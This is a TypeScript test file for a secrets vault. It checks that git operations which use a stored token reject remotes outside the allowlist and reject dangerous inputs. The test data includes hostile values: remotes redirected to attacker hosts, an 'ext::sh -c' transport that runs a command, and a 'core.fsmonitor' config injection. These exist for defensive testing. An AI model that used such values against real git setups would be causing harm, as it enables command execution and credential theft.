import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { ErrorCode } from "@harpoc/shared";
import { controlledPathDirs, resolveExecutable } from "@harpoc/core";
import { DirectClient } from "@harpoc/sdk";
import { createTestVault, destroyTestVault } from "./helpers/engine-factory.js";
import type { TestVault } from "./helpers/engine-factory.js";
import { tierRequired } from "./helpers/platform-tiers.js";
import { expectVaultError } from "@harpoc/test-utils";

/**
 * Git context (thesis §4.5.6, §6.2 remote-redirection). Deterministic
 * enforcement across both transports: an HTTPS remote outside the URL allowlist
 * and an SSH remote host outside the host allowlist are both rejected before any
 * authentication; forbidden transports and dangerous args are refused. Target
 * validation is transport-independent, so a redirected push cannot slip through
 * over SSH after being blocked over HTTPS. Tier-1 enforcement — no live remote.
 */

const PASSWORD = "integration-test-pw";
const GIT_SECRET = "x-access-token:ghp_git-secret-abcd";
const GIT = resolveExecutable("git", controlledPathDirs());

const describeGit = describe.skipIf(GIT === null);

// A leg that exports the ssh-live tier ships git as well (TM-11): where git does not resolve
// on such a leg, this guard fails the file instead of letting the suite below skip silently.
it("ssh-live tier: required legs fail instead of skipping when git is unresolvable", () => {
  if (GIT === null && tierRequired("ssh-live")) {
    throw new Error(
      'HARPOC_REQUIRE_PLATFORM_TESTS demands the "ssh-live" tier but no git resolves',
    );
  }
});

describeGit("Git context (both mechanisms, §4.5.6)", () => {
  let vault: TestVault;
  let handle: string;
  let client: DirectClient;

  beforeEach(async () => {
    vault = createTestVault();
    await vault.engine.initVault(PASSWORD);
    const created = await vault.engine.createSecret({
      name: "git-key",
      type: "api_key",
      value: new Uint8Array(Buffer.from(GIT_SECRET, "utf8")),
    });
    handle = created.handle;
    await vault.engine.setInjectionPolicy(handle, {
      url_allowlist: ["https://github.com/*"],
      command_allowlist: [GIT as string],
      env_allowlist: [],
      host_allowlist: ["github.com"],
    });
    client = new DirectClient(vault.engine);
  });

  afterEach(async () => {
    await destroyTestVault(vault);
  });

  it("blocks a redirected HTTPS remote outside the URL allowlist", async () => {
    await expect(
      client.useSecret(handle, {
        type: "git",
        operation: "clone",
        repository: "https://8.8.8.8/attacker/repo.git",
      }),
    ).rejects.toMatchObject({ code: ErrorCode.URL_NOT_ALLOWED });
  });

  it("blocks a redirected SSH remote host outside the host allowlist", async () => {
    await expect(
      client.useSecret(handle, {
        type: "git",
        operation: "push",
        repository: "git@attacker.example.com:org/repo.git",
        working_directory: vault.tmpDir,
      }),
    ).rejects.toMatchObject({ code: ErrorCode.HOST_NOT_ALLOWED });
  });

  it("refuses a command-executing transport (ext::)", async () => {
    await expect(
      client.useSecret(handle, {
        type: "git",
        operation: "clone",
        repository: "ext::sh -c touch${IFS}/tmp/pwned",
      }),
    ).rejects.toMatchObject({ code: ErrorCode.GIT_UNSUPPORTED_TRANSPORT });
  });

  it("refuses config-injection via a dangerous argument", async () => {
    await expect(
      client.useSecret(handle, {
        type: "git",
        operation: "clone",
        repository: "https://github.com/org/repo.git",
        args: ["--config", "core.fsmonitor=/tmp/evil"],
      }),
    ).rejects.toMatchObject({ code: ErrorCode.INVALID_GIT_CONFIG });
  });

  it("I1: the token never appears in a rejection", async () => {
    const err = await expectVaultError(
      () =>
        client.useSecret(handle, {
          type: "git",
          operation: "clone",
          repository: "https://8.8.8.8/attacker/repo.git",
        }),
      ErrorCode.URL_NOT_ALLOWED,
    );
    expect(err.message).not.toContain("ghp_git-secret");
    expect(String(err.stack)).not.toContain("ghp_git-secret");
    expect(JSON.stringify(err)).not.toContain("ghp_git-secret");
  });
});
